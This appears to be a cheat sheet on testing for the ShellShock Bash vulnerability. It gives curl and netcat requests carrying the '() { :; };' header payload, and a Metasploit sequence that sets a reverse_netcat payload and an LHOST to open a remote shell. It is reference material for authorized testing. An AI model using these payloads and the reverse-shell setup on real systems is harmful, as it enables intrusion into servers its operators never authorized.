ShellShock, also known as the Bash Bug, refers to a security vulnerability in the Bash shell that was disclosed in September 2014. It allows attackers to execute arbitrary commands on systems using vulnerable versions of Bash. Tools related to ShellShock are typically used to exploit or test for this vulnerability.

### **ShellShock Commands and Options**

**Note:** ShellShock itself is a vulnerability and not a tool with a command-line interface. However, you can use various scripts and tools to test or exploit this vulnerability. Below are some examples and options for using ShellShock-related tools and techniques.

---

### **1. Using `curl` to Test for ShellShock**

**Description:** Send a request with a header to test if a server is vulnerable to ShellShock.

- **Command:**
  ```bash
  curl -H 'User-Agent: () { :; }; echo Vulnerable' http://target-url
  ```

- **Example:**
  ```bash
  curl -H 'User-Agent: () { :; }; echo Vulnerable' http://example.com/cgi-bin/test.cgi
  ```

- **Explanation:** This command sends a specially crafted `User-Agent` header that exploits the ShellShock vulnerability. If the server is vulnerable, it will execute the command and return the result.

---

### **2. Using `netcat` to Test for ShellShock**

**Description:** Use `netcat` to send a crafted HTTP request to test for vulnerability.

- **Command:**
  ```bash
  (echo -ne "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: target-url\r\nUser-Agent: () { :; }; echo Vulnerable\r\n\r\n") | nc target-url 80
  ```

- **Example:**
  ```bash
  (echo -ne "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: example.com\r\nUser-Agent: () { :; }; echo Vulnerable\r\n\r\n") | nc example.com 80
  ```

- **Explanation:** Sends an HTTP request with a crafted `User-Agent` header to check if the server is vulnerable.

---

### **3. Using Exploit Scripts**

**Description:** Use pre-written exploit scripts to test for ShellShock. These are often found in repositories like GitHub or Exploit-DB.

- **Command:**
  ```bash
  python shellshock_exploit.py -u http://target-url/cgi-bin/test.cgi
  ```

- **Example:**
  ```bash
  python shellshock_exploit.py -u http://example.com/cgi-bin/test.cgi
  ```

- **Explanation:** Runs a Python exploit script against the specified URL to check for ShellShock vulnerability.

---

### **4. Using Metasploit Framework**

**Description:** Metasploit has modules for exploiting ShellShock vulnerabilities.

- **Command:**
  ```bash
  msfconsole
  ```

  Inside Metasploit:
  ```bash
  use exploit/multi/http/apache_mod_cgi_bash_env
  set RHOSTS target-url
  set PAYLOAD cmd/unix/reverse_netcat
  set LHOST local-ip
  exploit
  ```

- **Example:**
  ```bash
  msfconsole
  ```

  Inside Metasploit:
  ```bash
  use exploit/multi/http/apache_mod_cgi_bash_env
  set RHOSTS example.com
  set PAYLOAD cmd/unix/reverse_netcat
  set LHOST 192.168.1.100
  exploit
  ```

- **Explanation:** Uses the Metasploit module to exploit ShellShock vulnerabilities on a target server.

---

### **5. Using ShellShock Check Tools**

**Description:** Use dedicated tools to scan for ShellShock vulnerabilities.

- **Command:**
  ```bash
  shellshock-check -u http://target-url/cgi-bin/test.cgi
  ```

- **Example:**
  ```bash
  shellshock-check -u http://example.com/cgi-bin/test.cgi
  ```

- **Explanation:** Executes a check for the ShellShock vulnerability on the specified URL.

---

### **Summary of ShellShock Testing Commands**

| **Method**                | **Command Example**                                                | **Description**                                             |
|---------------------------|--------------------------------------------------------------------|-------------------------------------------------------------|
| **Curl Test**             | `curl -H 'User-Agent: () { :; }; echo Vulnerable' http://example.com/cgi-bin/test.cgi` | Test if a server is vulnerable using a crafted `User-Agent` header. |
| **Netcat Test**           | `(echo -ne "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: example.com\r\nUser-Agent: () { :; }; echo Vulnerable\r\n\r\n") | nc example.com 80` | Test for ShellShock using `netcat` to send a crafted HTTP request. |
| **Exploit Script**        | `python shellshock_exploit.py -u http://example.com/cgi-bin/test.cgi` | Run a Python script to exploit ShellShock.                |
| **Metasploit**            | `use exploit/multi/http/apache_mod_cgi_bash_env`<br>`set RHOSTS example.com`<br>`set PAYLOAD cmd/unix/reverse_netcat`<br>`set LHOST 192.168.1.100`<br>`exploit` | Use Metasploit to exploit ShellShock vulnerabilities.       |
| **ShellShock Check Tool** | `shellshock-check -u http://example.com/cgi-bin/test.cgi`           | Use a dedicated tool to check for ShellShock vulnerability. |

> [!note]
> ShellShock is a critical vulnerability, and it's important to ensure that any testing or exploitation is done with proper authorization and for ethical purposes only.

